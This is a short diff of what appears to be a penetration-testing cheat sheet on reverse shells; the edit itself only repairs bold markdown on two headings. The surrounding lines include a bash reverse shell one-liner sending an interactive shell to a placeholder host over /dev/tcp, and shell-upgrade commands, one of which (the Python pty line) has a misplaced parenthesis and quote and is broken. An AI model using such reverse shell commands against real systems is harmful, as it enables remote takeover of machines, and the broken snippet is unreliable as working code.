@@ -8,7 +8,7 @@ Easy Bash
 bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"
 ```
 ## Shell Upgrades
-* **Bash
+* **Bash**
   ```bash
   root@target:/backend# script /dev/null -c bash
   script /dev/null -c bash            
@@ -22,7 +22,7 @@ bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"
   Terminal type? screen
   root@target:/backend#
   ```
-* **Python Shell Upgrade
+* **Python Shell Upgrade**
   ```bash
   python -c ('import pty; pty.spawn("/bin/bash")'
   ```
